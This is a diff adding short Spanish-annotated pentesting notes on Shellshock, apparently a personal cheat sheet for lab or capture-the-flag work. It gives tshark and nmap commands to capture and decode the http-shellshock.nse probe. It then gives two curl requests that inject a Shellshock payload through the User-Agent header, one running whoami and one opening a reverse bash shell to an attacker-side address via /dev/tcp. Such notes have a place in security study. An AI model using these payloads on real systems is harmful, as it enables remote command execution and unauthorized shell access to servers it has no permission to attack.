@@ -8,3 +8,26 @@
 
 
 	::: tshark -r  -Tfields -e tcp.payload  file.cap | xxd -ps -r
+
+
+
+*** ShellShock
+	::: tshark -w Captura.cap -i tun0					"capturar el trafico del script http-shellshock.nse"
+
+	 :: nmap  --script  http-shellshock.nse  --script-args  uri=/folderTarged/exampla.sh  -p80  $(mvnb)
+
+	 :: tshark  -r Captura.cap  2>/dev/null     "Leer el archivo Captura.cap"
+
+	 :: tshark  -r Captura.cap  -Y "http"  2>/dev/null     "Filtrar por http con -Y"
+
+	 :: tshark  -r Captura.cap  -Y "http"  -Tjson  2>/dev/null     "Mostrar en formato JSON"
+
+	 :: tshark  -r Captura.cap  -Y "http"  -Tfields -e "tcp.payload"  2>/dev/null					"obtiene el hexadecimal"
+
+	 :: tshark  -r Captura.cap  -Y "http"  -Tfields -e "tcp.payload"  2>/dev/null | xxd -ps -r; echo   "convert hexadecimal"
+
+	 :: curl -s -X GET "http://$(mvnb)/folderTarged/file.sh" -H "User-Agent: () { :; };echo; /usr/bin/whoami"
+
+	 :: curl -s -X GET "http://$(mvnb)/folderTarged/file.sh" -H "User-Agent: () { :; };echo; /bin/bash -i >& /dev/tcp/ip_vpn/1234 0>&1"
+
+
